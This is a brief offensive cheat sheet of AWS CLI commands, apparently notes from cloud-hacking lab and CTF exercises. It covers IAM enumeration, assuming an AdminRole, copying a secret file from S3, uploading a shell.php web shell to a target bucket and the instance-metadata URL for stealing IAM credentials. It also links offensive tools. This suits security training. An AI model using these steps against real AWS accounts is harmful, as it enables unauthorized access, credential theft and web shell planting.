# Table of contents

- [Enumeration](#enumeration)

aws sts get-caller-identity

get user policies
aws iam list-user-policies --user-name username

get details about policy
aws iam get-user-policy --user-name username --policy-name policyname

aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession --profile pwnedlabs
aws configure
aws configure set aws_session_token "<SessionToken>" 

aws s3 ls s3://emergency-data-recovery
aws s3 cp s3://emergency-data-recovery/secret.txt .

aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb/
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/

AWS metaservice instance
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/


### Tools
https://github.com/shabarkin/aws-enumerator
https://github.com/RhinoSecurityLabs/pacu

https://github.com/WeAreCloudar/s3-account-search/